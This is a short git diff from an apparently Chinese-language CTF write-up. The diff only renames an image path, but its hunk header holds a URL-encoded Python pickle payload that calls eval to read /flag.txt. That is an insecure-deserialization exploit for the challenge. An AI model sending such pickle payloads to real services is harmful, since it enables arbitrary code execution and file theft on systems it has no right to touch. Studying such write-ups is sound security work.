@@ -135,7 +135,7 @@ c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29
 
 提交payload
 
-![](<../../.gitbook/assets/image (10) (1) (1).png>)
+![](<../../.gitbook/assets/image (10) (1) (1) (1).png>)
 
 结果
 
